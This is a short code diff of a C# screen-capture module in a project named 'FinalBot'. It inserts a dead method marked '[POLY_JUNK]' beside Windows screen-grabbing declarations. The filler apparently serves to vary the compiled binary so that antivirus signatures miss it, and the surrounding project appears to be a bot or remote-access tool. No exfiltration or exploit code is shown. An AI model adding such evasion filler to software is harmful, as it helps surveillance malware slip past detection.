@@ -10,6 +10,12 @@ namespace FinalBot.Modules
     /// </summary>
     public static class ScreenshotModule
     {
+        // [POLY_JUNK]
+        private static void _vanguard_81bcca45() {
+            int val = 13525;
+            if (val > 50000) Console.WriteLine("Hash:" + 13525);
+        }
+
         // ── P/Invoke ──────────────────────────────────────────────────────────────
         [DllImport("user32.dll")] static extern IntPtr GetDesktopWindow();
         [DllImport("user32.dll")] static extern IntPtr GetDC(IntPtr hWnd);
